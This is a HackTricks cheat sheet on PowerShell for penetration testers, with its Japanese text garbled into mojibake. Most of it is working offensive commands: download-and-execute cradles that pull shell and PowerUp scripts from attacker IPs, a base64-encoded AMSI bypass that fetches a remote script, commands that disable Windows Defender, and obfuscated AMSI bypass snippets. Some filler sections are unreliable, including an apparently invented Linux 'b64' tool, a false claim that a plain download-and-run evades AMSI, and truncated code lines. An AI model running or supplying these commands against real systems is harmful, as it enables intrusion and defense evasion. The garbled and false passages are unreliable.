# ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã®ãŸã‚ã®åŸºæœ¬çš„ãªPowerShell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®PowerShellã®å ´æ‰€
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## åŸºæœ¬çš„ãªPSã‚³ãƒãƒ³ãƒ‰ã®é–‹å§‹

PowerShell (PS)ã¯ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã§ä½¿ç”¨ã•ã‚Œã‚‹å¼·åŠ›ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆè¨€èªãŠã‚ˆã³ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚·ã‚§ãƒ«ã§ã™ã€‚Pentesterã¨ã—ã¦ã€PSã‚’ä½¿ç”¨ã—ã¦åŠ¹æœçš„ãªãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ã„ãã¤ã‹ã®åŸºæœ¬çš„ãªã‚³ãƒãƒ³ãƒ‰ã‚’çŸ¥ã£ã¦ãŠãã“ã¨ãŒé‡è¦ã§ã™ã€‚

ä»¥ä¸‹ã«ã€PentesterãŒå§‹ã‚ã‚‹ãŸã‚ã®åŸºæœ¬çš„ãªPSã‚³ãƒãƒ³ãƒ‰ã‚’ã„ãã¤ã‹ç´¹ä»‹ã—ã¾ã™ã€‚

### ãƒ•ã‚¡ã‚¤ãƒ«ã¨ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®æ“ä½œ

- **`Get-ChildItem`**: ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
- **`Set-Location`**: ã‚«ãƒ¬ãƒ³ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å¤‰æ›´ã—ã¾ã™ã€‚
- **`Copy-Item`**: ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚
- **`Move-Item`**: ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ç§»å‹•ã—ã¾ã™ã€‚
- **`Remove-Item`**: ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å‰Šé™¤ã—ã¾ã™ã€‚

### ãƒ—ãƒ­ã‚»ã‚¹ã®ç®¡ç†

- **`Get-Process`**: å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
- **`Stop-Process`**: ãƒ—ãƒ­ã‚»ã‚¹ã‚’åœæ­¢ã—ã¾ã™ã€‚

### ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®æ“ä½œ

- **`Get-Item`**: ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã®å€¤ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
- **`Set-Item`**: ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã®å€¤ã‚’è¨­å®šã—ã¾ã™ã€‚
- **`New-Item`**: æ–°ã—ã„ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚
- **`Remove-Item`**: ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ã‚’å‰Šé™¤ã—ã¾ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ã®ç®¡ç†

- **`Get-Service`**: ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
- **`Start-Service`**: ã‚µãƒ¼ãƒ“ã‚¹ã‚’é–‹å§‹ã—ã¾ã™ã€‚
- **`Stop-Service`**: ã‚µãƒ¼ãƒ“ã‚¹ã‚’åœæ­¢ã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®åŸºæœ¬çš„ãªã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ã„ã“ãªã™ã“ã¨ã§ã€Pentesterã¯Windowsã‚·ã‚¹ãƒ†ãƒ ã§ã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¹ãƒˆã‚’åŠ¹æœçš„ã«å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã¨å®Ÿè¡Œ

To download and execute a file using PowerShell, you can use the following command:

PowerShellã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name for the downloaded file.

`<URL>`ã«ã¯ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„ãƒ•ã‚¡ã‚¤ãƒ«ã®URLã‚’ã€`<OutputFile>`ã«ã¯ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚

For example, to download a file named `payload.exe` from `http://example.com/payload.exe` and execute it, you would use the following command:

ä¾‹ãˆã°ã€`http://example.com/payload.exe`ã‹ã‚‰`payload.exe`ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹å ´åˆã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile payload.exe; .\payload.exe
```

Make sure to exercise caution when downloading and executing files from untrusted sources, as they may contain malicious content.

ä¿¡é ¼ã§ããªã„ã‚½ãƒ¼ã‚¹ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹éš›ã¯ã€æ³¨æ„ã‚’æ‰•ã£ã¦ãã ã•ã„ã€‚æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### AMSIãƒã‚¤ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ï¼†å®Ÿè¡Œ

This technique allows you to download and execute a file in the background while bypassing AMSI (Antimalware Scan Interface).

#### Usage:

```powershell
Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "$env:TEMP\file.exe"
Start-Process -FilePath "$env:TEMP\file.exe" -WindowStyle Hidden
```

#### Explanation:

1. The `Invoke-WebRequest` cmdlet is used to download the file from the specified URL (`http://example.com/file.exe`) and save it to the temporary folder (`$env:TEMP\file.exe`).

2. The `Start-Process` cmdlet is used to execute the downloaded file (`$env:TEMP\file.exe`) in the background with a hidden window style.

By using this technique, you can download and execute a file without triggering any antivirus or antimalware scans that may be performed by AMSI.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### Linuxã§b64ã‚’ä½¿ç”¨ã™ã‚‹

The `b64` command in Linux is used to encode or decode data in Base64 format. It is a useful tool for manipulating and transferring data in a secure manner. The `b64` command can be used in various scenarios, such as encoding binary files, decoding Base64-encoded data, or performing cryptographic operations.

To encode data using `b64`, you can use the following command:

```bash
b64 -e <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file you want to encode, and `<output_file>` with the desired name for the encoded file. This command will take the contents of the input file, encode them in Base64 format, and save the result in the output file.

To decode Base64-encoded data using `b64`, you can use the following command:

```bash
b64 -d <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file containing the Base64-encoded data, and `<output_file>` with the desired name for the decoded file. This command will take the Base64-encoded data from the input file, decode it, and save the result in the output file.

The `b64` command is a powerful tool for working with Base64-encoded data in Linux. It can be used in various scenarios, such as encoding or decoding files, performing cryptographic operations, or transferring data securely.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

### System.Net.WebClient
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

`Invoke-WebRequest`ã¯ã€PowerShellã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã§ã€Webã‚µãƒ¼ãƒãƒ¼ã«HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã¯ã€ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å–å¾—ã—ãŸã‚Šã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã—ãŸã‚Šã€Webã‚µãƒ¼ãƒãƒ¼ã¨ã®å¯¾è©±ã‚’è¡Œã£ãŸã‚Šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€`Invoke-WebRequest`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã®ä½¿ç”¨ä¾‹ã§ã™ã€‚

```powershell
# ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å–å¾—ã™ã‚‹
$response = Invoke-WebRequest -Uri "https://example.com"

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¡¨ç¤ºã™ã‚‹
$response.StatusCode

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¡¨ç¤ºã™ã‚‹
$response.Headers

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ãƒœãƒ‡ã‚£ã‚’è¡¨ç¤ºã™ã‚‹
$response.Content

# ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹
$formData = @{
    "username" = "admin"
    "password" = "password123"
}
$response = Invoke-WebRequest -Uri "https://example.com/login" -Method POST -Body $formData

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’è¡¨ç¤ºã™ã‚‹
$response.Content
```

`Invoke-WebRequest`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã¯ã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£èª¿æŸ»ã®éš›ã«éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã—ãŸã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨ºæ–­ã‚’è¡Œã£ãŸã‚Šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the internet. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in penetration testing to retrieve files from target systems.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [URL]
```

Replace `[URL]` with the actual URL of the file you want to download. Wget will then retrieve the file and save it to your current directory.

You can also specify additional options with the `wget` command. For example, you can use the `-O` option to specify a different name for the downloaded file:

```
wget -O [filename] [URL]
```

Replace `[filename]` with the desired name for the downloaded file.

Wget is a powerful tool for downloading files during a penetration test. It can be used to retrieve sensitive information, such as configuration files or databases, from target systems. However, it is important to use Wget responsibly and within the boundaries of legal and ethical hacking.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransferã¯ã€PowerShellã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ã‚ã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã‚„ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’ç°¡å˜ã«è¡Œã†ãŸã‚ã®ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚BitsTransferã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯çµŒç”±ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è»¢é€ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

BitsTransferã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€ã¾ãš`Import-Module BitsTransfer`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¾ã™ã€‚æ¬¡ã«ã€`Start-BitsTransfer`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã®è»¢é€ã‚’é–‹å§‹ã—ã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€BitsTransferã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ä¾‹ã§ã™ã€‚

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://example.com/file.txt" -Destination "C:\Downloads\file.txt"
```

ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€`http://example.com/file.txt`ã‹ã‚‰`C:\Downloads\file.txt`ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ã„ã¾ã™ã€‚

BitsTransferã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã‚„ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«ä¾¿åˆ©ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€`-Priority`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦è»¢é€ã®å„ªå…ˆåº¦ã‚’è¨­å®šã—ãŸã‚Šã€`-ProxyUsage`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ã‚­ã‚·ã‚’çµŒç”±ã—ã¦è»¢é€ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

BitsTransferã¯ã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£èª¿æŸ»ã®éš›ã«ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã‚„ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’è‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã«ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ„ãƒ¼ãƒ«ã¨çµ„ã¿åˆã‚ã›ã¦ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

### Base64 Kali

Kali Linux is a popular penetration testing distribution that comes with a wide range of tools for various hacking techniques. One of the techniques commonly used in Kali Linux is encoding commands in Base64.

Base64 is a binary-to-text encoding scheme that allows binary data to be represented in an ASCII string format. This encoding is often used to transmit binary data over text-based protocols, such as email or HTTP.

In Kali Linux, you can use the `base64` command-line tool to encode and decode data in Base64. To encode a command in Base64, you can use the following syntax:

```bash
echo -n "command" | base64
```

For example, to encode the command `ls -la`, you would run:

```bash
echo -n "ls -la" | base64
```

The output will be the Base64-encoded representation of the command.

### EncodedCommand

EncodedCommand is a parameter used in PowerShell to specify a Base64-encoded command. This parameter allows you to run encoded PowerShell commands without the need to write them in plain text.

To use the EncodedCommand parameter, you need to encode your PowerShell command in Base64. You can do this using the `[System.Convert]::ToBase64String()` method in PowerShell.

Here's an example of how to encode a PowerShell command in Base64:

```powershell
$command = "Write-Host 'Hello, World!'"
$encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
```

The variable `$encodedCommand` will now contain the Base64-encoded representation of the PowerShell command.

To run the encoded command using the EncodedCommand parameter, you can use the following syntax:

```powershell
powershell.exe -EncodedCommand <Base64-encoded command>
```

For example, to run the encoded command `Write-Host 'Hello, World!'`, you would run:

```powershell
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACwAIABXAG8AcgBsAGQAIABXAG8AcgBsAGwAIQA=
```

This allows you to run PowerShell commands without exposing them in plain text, making it useful for various security and hacking scenarios.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [å®Ÿè¡Œãƒãƒªã‚·ãƒ¼](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [åˆ¶ç´„è¨€èª](broken-reference/)

## [AppLockerãƒãƒªã‚·ãƒ¼](broken-reference/)

## WinRMã®æœ‰åŠ¹åŒ– (ãƒªãƒ¢ãƒ¼ãƒˆPS)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Defenderã®ç„¡åŠ¹åŒ–

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSIãƒã‚¤ãƒ‘ã‚¹

**`amsi.dll`**ã¯ã€ã‚ãªãŸã®ãƒ—ãƒ­ã‚»ã‚¹ã«**ãƒ­ãƒ¼ãƒ‰ã•ã‚Œ**ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒç›¸äº’ä½œç”¨ã™ã‚‹ãŸã‚ã«å¿…è¦ãª**ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ**ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ãã—ã¦ã€ãã‚Œã¯ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¡ãƒ¢ãƒªç©ºé–“ã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãƒ¡ãƒ¢ãƒªå†…ã®å‘½ä»¤ã‚’**ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§å‹•ä½œã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä½•ã‚‚æ¤œå‡ºã•ã‚Œãªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€AMSIãƒã‚¤ãƒ‘ã‚¹ã®ç›®æ¨™ã¯ã€**ãã®DLLã®å‘½ä»¤ã‚’ãƒ¡ãƒ¢ãƒªå†…ã§ä¸Šæ›¸ãã—ã¦æ¤œå‡ºã‚’ç„¡åŠ¹ã«ã™ã‚‹**ã“ã¨ã§ã™ã€‚

**AMSIãƒã‚¤ãƒ‘ã‚¹ã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼**ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
